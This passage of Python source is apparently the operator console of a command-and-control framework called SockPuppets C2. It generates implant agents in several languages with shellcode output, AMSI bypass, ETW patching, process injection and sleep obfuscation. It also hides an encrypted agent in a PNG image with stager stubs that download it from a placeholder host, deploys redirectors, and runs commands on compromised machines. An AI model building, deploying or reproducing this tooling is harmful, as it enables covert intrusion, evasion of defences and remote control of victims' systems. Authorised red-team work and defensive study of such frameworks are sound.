            print(f"\n[*] Generating C# agent...")
            try:
                cs_path = generator.generate_csharp_agent(
                    host, port, encryption_key=key, transport=transport,
                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter
                )
                results['csharp'] = cs_path
            except Exception as e:
                results['csharp'] = f"Error: {e}"

        if lang in ('python', 'all'):
            results.update(generator.generate_all(
                c2_host=host, c2_port=port, encryption_key=key,
                beacon_mode=beacon_mode, beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                compile_exe=compile_exe, compile_dll=compile_dll, generate_shellcode=gen_shellcode,
                shellcode_format=shellcode_format, architectures=architectures, upx=use_upx, icon=icon,
                target_os=target_os, generate_multi_os=multi_os, transport=transport,
                amsi=amsi, etw=etw, syscalls=syscalls,
                inject=inject, inject_target=inject_target,
                sleep_obf=sleep_obf, idle_encrypt=idle_encrypt, profile=profile,
                redirector=redirector, bof=bof,
                obfuscation=obfuscation,
            ))

        if lang in ('powershell', 'all'):
            try:
                ps_path = generator.generate_powershell_agent(
                    host, port, encryption_key=key, transport=transport,
                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter
                )
                results['powershell'] = ps_path
            except Exception as e:
                results['powershell'] = f"Error: {e}"

        if lang in ('c', 'all'):
            try:
                c_path = generator.generate_c_agent(
                    host, port, key, transport=transport,
                    beacon_interval=beacon_interval, beacon_jitter=beacon_jitter,
                )
                results['c'] = c_path
            except Exception as e:
                results['c'] = f"Error: {str(e)}"
                print(f"[-] C agent failed: {str(e)}")

        # Register all generated per-agent keys with the server
        generated_keys = getattr(generator, 'generated_keys', [])
        if generated_keys:
            for k in generated_keys:
                self.server.add_encryption_key(k)
            print(f"\n[*] Registered {len(generated_keys)} unique agent keys with server")

        print("\n[+] Agent generation complete!")
        print("=" * 60)
        for agent_type, path in results.items():
            print(f"  {agent_type.upper()}: {path}")

        # Generate one-liners if requested
        if oneliners_url:
            print("\n[*] Generating one-liner payloads...")
            oneliners = generator.generate_oneliners(oneliners_url, 'oneliners.txt')
            print(f"[+] Generated {len(oneliners)} one-liner variants")
            for name in oneliners.keys():
                print(f"    - {name}")

        # Stego embedding and stager generation
        if stego:
            from stego import encrypt_payload, embed_append, embed_chunk
            from stego import generate_carrier_image, generate_stegoloader

            # Find first successful agent binary from results
            agent_path = None
            for agent_type, path in results.items():
                if isinstance(path, str) and not path.startswith('Error:') and os.path.isfile(path):
                    agent_path = path
                    agent_lang = agent_type
                    break

            if agent_path:
                print(f"\n[*] Embedding {agent_lang} agent in stego image ({stego_method} method)...")
                with open(agent_path, 'rb') as f:
                    agent_data = f.read()

                encrypted = encrypt_payload(agent_data, key)

                # Generate carrier image
                carrier_data = generate_carrier_image()
                carrier_path = os.path.join('output', '_carrier_tmp.png')
                with open(carrier_path, 'wb') as f:
                    f.write(carrier_data)

                stego_path = os.path.join('output', 'agent_stego.png')
                if stego_method == 'chunk':
                    embed_chunk(carrier_path, encrypted, stego_path)
                else:
                    embed_append(carrier_path, encrypted, stego_path)

                os.remove(carrier_path)

                print(f"[+] Stego image: {stego_path} ({os.path.getsize(stego_path)} bytes)")
                print(f"    Agent: {os.path.basename(agent_path)} ({len(agent_data)} bytes)")
                print(f"    Encrypted size: {len(encrypted)} bytes")

                # Generate stager stubs
                stego_url = 'http://YOUR_HOST/image.png'
                loader_paths = generate_stegoloader(stego_url, key, stego_method)
                print(f"\n[+] Stegoloader stager stubs generated:")
                for loader_lang, loader_path in loader_paths.items():
                    print(f"    {loader_lang.upper()}: {loader_path}")
                print(f"\n[*] Replace YOUR_HOST in stager stubs with your image hosting URL")
                print(f"[*] Host {stego_path} on a web server, CDN, or image sharing site")
            else:
                print("\n[-] No agent binary found to embed in stego image")

    def do_redirectors(self, arg):
        """List configured redirectors"""
        try:
            from redirectors import list_redirectors
        except ImportError:
            print("[-] Redirector support requires pyyaml: pip install pyyaml")
            return

        configs = list_redirectors()
        if not configs:
            print("[-] No redirector configs found")
            return

        print(f"\n\033[1mConfigured Redirectors:\033[0m")
        print("=" * 70)
        for config in configs:
            status = "\033[92m[active]\033[0m" if config.type != "direct" else "\033[90m[direct]\033[0m"
            print(f"  {status} \033[1m{config.name}\033[0m")
            if config.description:
                print(f"         {config.description}")
            if config.domain:
                print(f"         Domain:  {config.domain}")
            if config.backend:
                print(f"         Backend: {config.backend}")
            if config.profile:
                print(f"         Profile: {config.profile}")
            print()

    def do_redirector_deploy(self, arg):
        """Generate redirector deploy config: redirector-deploy <name> <format>"""
        try:
            from redirectors import load_redirector, generate_deploy_config
        except ImportError:
            print("[-] Redirector support requires pyyaml: pip install pyyaml")
            return

        args = arg.split()
        if len(args) != 2:
            print("[-] Usage: redirector-deploy <name> <format>")
            print("    Formats: apache, nginx, socat, iptables, lambda")
            return

        name, fmt = args[0], args[1]
        try:
            config = load_redirector(name)
            output = generate_deploy_config(config, fmt)
            print(output)
        except FileNotFoundError:
            print(f"[-] Redirector config not found: {name}")
        except ValueError as e:
            print(f"[-] {e}")

    def do_gui(self, arg):
        """GUI management: gui start [port] | gui stop | gui adduser <name> <password> | gui users | gui rmuser <name>"""
        args = arg.split()
        if not args:
            print("[-] Usage: gui start [port] | gui stop | gui adduser <name> <password> | gui users | gui rmuser <name>")
            return

        action = args[0].lower()

        if action == 'start':
            port = 13337
            if len(args) > 1:
                try:
                    port = int(args[1])
                except ValueError:
                    print("[-] Invalid port number")
                    return

            if not self.server_running:
                print("[-] Start the C2 server first with 'start'")
                return

            try:
                from gui import start_gui
                from gui.auth import operators
                if len(operators) == 0:
                    operators.add("admin", "admin", must_change=True)
                    print(f"[+] Default operator created — username: admin / password: admin")
                    print(f"[!] Password change required on first login")
                start_gui(self.server, port)
                print(f"[+] GUI started on http://0.0.0.0:{port}")
                print(f"[*] {len(operators)} operator(s) registered")
            except ImportError:
                print("[-] GUI requires fastapi and uvicorn: pip install -r requirements-gui.txt")
            except Exception as e:
                print(f"[-] Failed to start GUI: {e}")

        elif action == 'stop':
            try:
                from gui import stop_gui
                stop_gui()
                print("[+] GUI stopped")
            except Exception as e:
                print(f"[-] Error stopping GUI: {e}")

        elif action == 'adduser':
            if len(args) < 3:
                print("[-] Usage: gui adduser <operator-name> <password>")
                return
            name = args[1]
            password = args[2]
            from gui.auth import operators
            if name in operators.list():
                print(f"[-] Operator '{name}' already exists. Remove first with: gui rmuser {name}")
                return
            operators.add(name, password, must_change=True)
            print(f"[+] Operator '{name}' created")
            print(f"[!] Operator must change password on first login")

        elif action == 'rmuser':
            if len(args) < 2:
                print("[-] Usage: gui rmuser <operator-name>")
                return
            name = args[1]
            from gui.auth import operators
            if operators.remove(name):
                print(f"[+] Operator '{name}' removed")
            else:
                print(f"[-] Operator '{name}' not found")

        elif action == 'users':
            from gui.auth import operators
            names = operators.list()
            if not names:
                print("[*] No operators registered. Create one with: gui adduser <name>")
            else:
                print(f"\n\033[1mRegistered Operators ({len(names)}):\033[0m")
                for n in names:
                    print(f"  - {n}")
                print()

        else:
            print("[-] Usage: gui start [port] | gui stop | gui adduser <name> | gui users | gui rmuser <name>")

    def do_debug(self, arg):
        """Toggle debug mode: debug [on|off]"""
        import logging

        if not arg:
            current_level = logging.getLogger().level
            status = "ON" if current_level == logging.DEBUG else "OFF"
            print(f"[*] Debug mode is currently: {status}")
            print("[*] Usage: debug [on|off]")
            return

        arg = arg.strip().lower()
        if arg == 'on':
            logging.getLogger().setLevel(logging.DEBUG)
            logging.getLogger('websockets').setLevel(logging.INFO)
            print("[+] Debug mode enabled")
        elif arg == 'off':
            logging.getLogger().setLevel(logging.INFO)
            logging.getLogger('websockets').setLevel(logging.WARNING)
            print("[+] Debug mode disabled")
        else:
            print("[-] Invalid argument. Use: debug [on|off]")

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
        print(ASCII_ART)

    def do_exit(self, arg):
        """Exit the program"""
        if self.server_running:
            self.do_stop('')

        print("[*] Goodbye!")
        sys.exit(0)

    def do_quit(self, arg):
        """Exit the program"""
        return self.do_exit(arg)

    def do_help(self, arg):
        """Show help menu"""
        if arg:
            super().do_help(arg)
            return

        if HAS_RICH:
            print_help_panel()
            return

        print("\n\033[1mServer Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mstart [host] [port] [--key=K]\033[0m             - Start WebSocket listener")
        print("  \033[1mstart http [host] [port]\033[0m                  - Start HTTP listener")
        print("  \033[1mstart https [host] [port] [--cert=C]\033[0m     - Start HTTPS listener")
        print("  \033[1mlisteners\033[0m                                 - List active listeners")
        print("  \033[1mstop [ws|http|https]\033[0m                      - Stop listener(s)")
        print()
        print("\033[1mAgent Commands:\033[0m")
        print("=" * 70)
        print("  \033[1magents / puppets\033[0m                          - List all connected agents")
        print("  \033[1mbeacons\033[0m                                   - List only beacon agents")
        print("  \033[1mstreamers\033[0m                                 - List only streaming agents")
        print("  \033[1minteract <agent_id>\033[0m                       - Interact with an agent")
        print("  \033[1mremove <agent_id>\033[0m                         - Remove dead agent from tracking")
        print()
        print("\033[1mGenerate Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mgenerate <host> <port> [opts]\033[0m             - Generate agent payloads")
        print()
        print("\033[1mOther Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mdebug [on|off]\033[0m                            - Toggle debug logging")
        print("  \033[1mclear\033[0m                                     - Clear the screen")
        print("  \033[1mexit/quit\033[0m                                 - Exit the program")
        print()
        print("\033[1mGenerate Options:\033[0m")
        print("=" * 70)
        print("  \033[1m--transport=TYPE\033[0m       Transport: websocket, http, https")
        print("  \033[1m--beacon\033[0m              Enable beacon mode (stealth)")
        print("  \033[1m--interval=N\033[0m          Beacon check-in interval in seconds")
        print("  \033[1m--jitter=N\033[0m            Beacon jitter percentage (0-100)")
        print("  \033[1m--compile\033[0m             Compile Python agent to executable")
        print("  \033[1m--dll\033[0m                 Compile Python agent to DLL (Windows)")
        print("  \033[1m--shellcode\033[0m           Generate shellcode from agent")
        print("  \033[1m--format=FMT\033[0m          Shellcode format (raw, c, python, powershell)")
        print("  \033[1m--os=OS\033[0m               Target OS (auto, windows, linux, macos)")
        print("  \033[1m--multi-os\033[0m            Generate agents for all OS types")
        print("  \033[1m--arch=ARCH\033[0m           Target architecture (x86, x64, arm64)")
        print("  \033[1m--multi-arch\033[0m          Compile for all architectures")
        print("  \033[1m--no-upx\033[0m              Disable UPX compression")
        print("  \033[1m--icon=PATH\033[0m           Custom icon for executable")
        print("  \033[1m--key=KEY\033[0m             Custom encryption key")
        print("  \033[1m--oneliners=URL\033[0m       Generate one-liner payloads")
        print()
        print("\033[1mEvasion Options:\033[0m")
        print("=" * 70)
        print("  \033[1m--amsi\033[0m                Enable AMSI bypass (Windows, Python/PS)")
        print("  \033[1m--etw\033[0m                 Enable ETW patching (Windows, Python/PS)")
        print("  \033[1m--syscalls=MODE\033[0m       Syscall wrappers: indirect, direct")
        print("  \033[1m--inject=TECHNIQUE\033[0m    Injection: createthread, apc, hollowing, stomp")
        print("  \033[1m--inject-target=PROC\033[0m  Target process for injection")
        print("  \033[1m--sleep-obf=TECHNIQUE\033[0m Sleep obfuscation: ekko, foliage")
        print("  \033[1m--idle-encrypt=SEC\033[0m    Streaming idle threshold (default: 30)")
        print("  \033[1m--profile=NAME\033[0m        Malleable C2 profile (default: default)")
        print("  \033[1m--patterns=NAME\033[0m       Obfuscation pattern set (default: default)")
        print("  \033[1m--redirector=NAME\033[0m     Route agents through a redirector config")
        print("  \033[1m--obfuscation=MODE\033[0m    Obfuscation mode (dynamic, default, or custom)")
        print("  \033[1m--bof\033[0m                 Enable BOF loader in agent")
        print("  \033[1m--evasion-all\033[0m         Enable all evasion with defaults")
        print()
        print("\033[1mRedirector Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mredirectors\033[0m                      - List configured redirectors")
        print("  \033[1mredirector-deploy <name> <fmt>\033[0m   - Generate deploy config")
        print()
        print("\033[1mGUI / TUI:\033[0m")
        print("=" * 70)
        print("  \033[1mgui start [port]\033[0m             - Start web GUI (default: 13337)")
        print("  \033[1mgui stop\033[0m                      - Stop web GUI")
        print("  \033[1mgui adduser <name>\033[0m           - Create operator with unique token")
        print("  \033[1mgui rmuser <name>\033[0m            - Remove an operator")
        print("  \033[1mgui users\033[0m                    - List registered operators")
        print("  Launch with --gui or --tui flag for alternative interfaces")
        print()
        print("\033[1mInteract Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mback\033[0m                  Return to main menu")
        print("  \033[1mresults\033[0m               View pending beacon results")
        print("  \033[1msocks <port>\033[0m          Start SOCKS5 proxy on port (WS only)")
        print("  \033[1msleep <seconds>\033[0m       Set beacon interval")
        print("  \033[1mupgrade\033[0m               Upgrade to streaming mode")
        print("  \033[1mupgrade_ws\033[0m            Upgrade HTTP agent to WebSocket")
        print("  \033[1mdowngrade [seconds]\033[0m   Downgrade to beacon mode")
        print("  \033[1mkill\033[0m                  Terminate the agent")
        print("  \033[1m<any command>\033[0m         Execute command on agent")
        print()
        print("\033[1mOther:\033[0m")
        print("=" * 70)
        print("  \033[1mdebug [on|off]\033[0m                            - Toggle debug logging")
        print("  \033[1mclear\033[0m                                     - Clear the screen")
        print("  \033[1mexit/quit\033[0m                                 - Exit the program")
        print()


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description='SockPuppets C2 Framework')
    parser.add_argument('--gui', nargs='?', const=13337, type=int, metavar='PORT',
                        help='Start web GUI on PORT (default: 13337)')
    parser.add_argument('--tui', action='store_true',
                        help='Start Textual TUI instead of CLI')
    args = parser.parse_args()

    if args.tui:
        try:
            from tui import launch_tui
            from server import SockPuppetsServer
            server = SockPuppetsServer()
            launch_tui(server)
        except ImportError:
            print("[-] TUI requires textual: pip install -r requirements-tui.txt")
            sys.exit(1)
        return

    try:
        cli = SockPuppetsCLI()

        if args.gui is not None:
            # Auto-start GUI if --gui flag was passed
            cli._start_gui_on_ready = args.gui

        cli.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)


if __name__ == '__main__':
    main()
